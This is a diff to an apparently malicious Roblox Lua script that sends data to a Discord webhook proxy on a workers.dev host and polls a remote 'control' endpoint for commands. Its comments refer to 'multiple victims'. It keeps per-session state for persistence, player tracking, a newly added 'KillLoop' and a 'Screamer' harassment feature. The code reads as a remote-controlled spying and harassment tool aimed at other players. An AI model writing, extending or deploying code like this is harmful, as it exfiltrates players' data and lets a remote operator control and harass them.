@@ -10,7 +10,6 @@ local PROXY = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/webhook"
 local CONTROL = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/control"
 
 -- Per-session unique ID so multiple victims don't conflict
--- Each execution gets its own state table keyed by session ID
 local SESSION_ID = tostring(LocalPlayer.UserId) .. "_" .. tostring(math.random(100000, 999999))
 
 -- Initialize global registry if not exists
@@ -18,7 +17,8 @@ if not getgenv().IntelSuiteRegistry then
     getgenv().IntelSuiteRegistry = {}
 end
 
--- Each session gets its own isolated state
+-- Each session gets its own isolated state table stored under its session ID
+-- We do NOT overwrite getgenv().IntelSuite globally — that broke multi-session
 getgenv().IntelSuiteRegistry[SESSION_ID] = {
     Buffer = "",
     IsActive = true,
@@ -30,13 +30,16 @@ getgenv().IntelSuiteRegistry[SESSION_ID] = {
     JoinLeaveActive = false,
     PersistenceLoop = false,
     PersistenceInstalled = false,
+    KillLoopActive = false,
+    ScreamerActive = false,
     SessionID = SESSION_ID
 }
 
--- Local reference for this session
+-- Local reference used throughout THIS execution only
 local IntelSuite = getgenv().IntelSuiteRegistry[SESSION_ID]
 
--- Backwards compat: keep getgenv().IntelSuite pointing to THIS session's state
+-- Also keep getgenv().IntelSuite pointing to this session for legacy module refs
+-- Each session overwrites this — that's OK because each session is self-contained
 getgenv().IntelSuite = IntelSuite
 
 local function POST(url, body)
